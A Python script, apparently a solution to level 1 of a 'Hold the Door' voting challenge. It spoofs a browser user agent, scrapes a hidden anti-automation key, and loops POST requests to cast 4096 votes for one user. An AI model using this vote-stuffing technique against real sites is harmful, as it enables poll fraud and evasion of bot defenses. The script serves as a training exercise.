#!/usr/bin/python3
'''
Module for Hodor level 1 challenge.

Has to have a valid user agent.

Has to parse the hidden 'key' field's 'value' from a GET request

Has to add the user's 'id' and 'holdthedoor' fields to POST request.

'''
import requests
import re
import time

url = 'http://158.69.76.135/level1.php'
data = {'id': '650', 'holdthedoor': 'Submit'}
agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 \
(KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
headers = {'User-Agent': agent}
success = 'Hold the Door challenge - Level 1'
votes = 4096
ok = 0
fail = 0
s = requests.Session()
s.headers.update(headers)

while ok < votes and fail < 100:
    try:
        response = s.get(url, headers=headers)
        if response.status_code is not 200:
            continue
        matches = re.findall("value=\"([^\"]+)\"",
                             response.text)
        if not len(matches):
            continue

        data["key"] = matches[0]
        # print(data)
        response = s.post(url, data=data)
        # print(response.text)
        if response.status_code is 200 and success in response.text:
            fail = 0
            ok += 1
            print("{} ok!".format(ok))
    except Exception as e:
        print(e)
        fail += 1

print("Finished: {}/{} votes.".format(ok, votes))
